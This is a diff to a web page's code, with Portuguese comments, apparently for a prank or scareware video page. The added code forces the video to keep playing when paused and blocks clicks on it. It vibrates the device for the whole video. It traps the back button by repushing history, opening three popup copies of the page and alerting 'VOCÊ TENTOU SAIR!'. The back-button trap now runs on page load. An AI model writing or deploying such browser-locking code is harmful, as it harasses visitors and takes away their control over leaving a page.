@@ -14,6 +14,7 @@
       width: 100vw;
       height: 100vh;
       object-fit: cover;
+      pointer-events: none; /* Impede clique no vídeo */
     }
     .mensagem {
       position: fixed;
@@ -36,17 +37,18 @@
     const video = document.getElementById("video");
     const msg = document.getElementById("msg");
 
-    document.body.addEventListener("click", () => {
-      video.requestFullscreen().catch(() => {});
-      video.play();
+    // Impede que pause via clique
+    video.addEventListener("pause", () => {
+      video.play(); // Força a continuar
+    });
 
-      // Estimar duração (você pode ajustar se souber o tempo exato)
-      const duracao = 30000; // 30 segundos
+    // Vibração durante o vídeo inteiro
+    video.addEventListener("loadedmetadata", () => {
+      const duracao = video.duration * 1000;
 
-      // Vibrar em pulsos
       if (navigator.vibrate) {
         const intervalo = setInterval(() => {
-          navigator.vibrate([200, 100, 200]);
+          navigator.vibrate([300, 100, 300]);
         }, 1000);
 
         setTimeout(() => {
@@ -55,19 +57,19 @@
         }, duracao);
       }
 
-      // Travar botão voltar e forçar popups
-      history.pushState(null, "", location.href);
-      window.onpopstate = () => {
-        history.pushState(null, "", location.href);
-        msg.style.display = "block";
-
-        for (let i = 0; i < 3; i++) {
-          window.open(location.href, "_blank");
-        }
-
-        alert("VOCÊ TENTOU SAIR!");
-      };
+      video.play();
     });
+
+    // Travar botão voltar e abrir popups
+    history.pushState(null, "", location.href);
+    window.onpopstate = () => {
+      history.pushState(null, "", location.href);
+      msg.style.display = "block";
+      for (let i = 0; i < 3; i++) {
+        window.open(location.href, "_blank");
+      }
+      alert("VOCÊ TENTOU SAIR!");
+    };
   </script>
 </body>
 </html>
